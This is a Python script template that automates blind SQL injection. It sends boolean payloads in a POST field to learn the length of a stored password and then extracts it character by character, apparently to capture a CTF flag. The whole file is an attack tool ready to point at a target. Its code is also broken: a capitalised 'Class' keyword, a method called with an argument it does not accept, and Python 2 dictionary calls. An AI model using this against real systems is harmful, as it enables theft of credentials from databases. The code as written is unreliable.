#!/usr/bin/env python3

from string import \
ascii_lowercase as L, \
ascii_uppercase as U, \
digits as D, \
punctuation as P

import requests

# TODO blind_length()

##### Config
HOST = ""
PORT = 80
PATH = "/index.php?id="
METHOD = "POST"
COOKIES = {
    "uid": "1"
}
DATA = {
    "username": "admin",
    "password": "<PAYLOAD>"
}

CHARSET = D + L + U + P
LENGTH = 0

PAYLOAD_LENGTH = "1' AND (SELECT LENGTH(password) from users) = <LEN> #"
PAYLOAD_BLIND = "1' AND SUBSTR((SELECT password from users), <POS>, 1) = <CHR> #"

SERVER_YES = ""
SERVER_NO = ""
##########

Class BlindSQLi():
    def __init__(self, host, method, cookies, charset, payload_length, payload_blind):
        self.host = host
        self.method = method
        self.cookies = cookies
        self.charset = charset
        self.length = 0
        self.maxlength = 100
        self.payload_length = payload_length
        self.payload_blind = payload_blind
        self.flag = ""

        self.s = requests.Session()
        self.s.cookies.update(COOKIES)

        self.blind_length()
        self.blind(self.length)

    def blind_length(self):
        for i in range(self.maxlength):
            if i == self.maxlength:
                print('[x] Reached max length')
                exit()

            payload = PAYLOAD_LENGTH.replace("<LEN>", str(i))
            data = {}
            for k in DATA.keys():
                if "<PAYLOAD>" in DATA[k]:
                    data[k] = DATA[k].replace("<PAYLOAD>", payload)
                else:
                    data[k] = DATA[k]

            r = self.send(data)
            res = r.text

            if SERVER_NO in res:
                continue
            elif SERVER_YES in res:
                self.length = i
                break
            else:
                print("[x] Can't find SERVER_NO nor SERVER_YES in response")
                exit()

        print("[+] Length:", self.length)

    def blind(self):
        for i in range(self.length):
            for c in CHARSET:
                payload = PAYLOAD_BLIND.replace("<POS>", str(i)).replace("<CHR>", c)
                data = {}
                for k in DATA.keys():
                    if "<PAYLOAD>" in DATA[k]:
                        data[k] = DATA[k].replace("<PAYLOAD>", payload)
                    else:
                        data[k] = DATA[k]

                r = self.send(data)
                res = r.text

                if SERVER_NO in res:
                    continue
                elif SERVER_YES in res:
                    self.flag += c
                    print("[+] Flag:", self.flag, end='\r')
                    break
                else:
                    print("[x] Can't find SERVER_NO nor SERVER_YES in response")
                    exit()

            # TODO : if charset incomplete

        print("[+] Finished")

    def send(self, data):
        if self.method == "POST":
            return self.s.post(self.host, data=data)
        elif self.method == "GET":
            get_params_str = '?'
            for k in data.keys():
                if data.keys().index(k) != 0:
                    get_params_str += '&'
                get_params_str += (k + '=' + data[k])
            return self.s.get(self.host + get_params_str)
        else:
            print ("[x] Invalid method:", METHOD)
            exit()


if __name__ == "__main__":
    blind = BlindSQLi( HOST+':'+str(PORT)+PATH, METHOD, COOKIES, CHARSET, PAYLOAD_LENGTH, PAYLOAD_BLIND )
